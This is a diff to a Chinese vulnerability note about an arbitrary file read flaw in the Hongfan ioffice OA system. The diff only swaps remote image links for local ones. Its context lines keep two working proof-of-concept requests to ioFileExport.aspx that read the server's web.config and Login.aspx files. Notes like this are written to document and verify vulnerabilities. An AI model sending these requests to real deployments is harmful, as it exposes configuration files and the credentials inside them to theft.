@@ -20,7 +20,7 @@ app="红帆-ioffice"
 
 登录页面
 
-![image-20220520142002215](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201420294.png)
+![image-20220520142002215](./images/202205201420294.png)
 
 验证POC, 读取web.config文件
 
@@ -28,10 +28,10 @@ app="红帆-ioffice"
 /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream
 ```
 
-![image-20220520142019955](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201420011.png)
+![image-20220520142019955](./images/202205201420011.png)
 
 ```
 /ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream
 ```
 
-![image-20220520142034423](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201420478.png)
+![image-20220520142034423](./images/202205201420478.png)
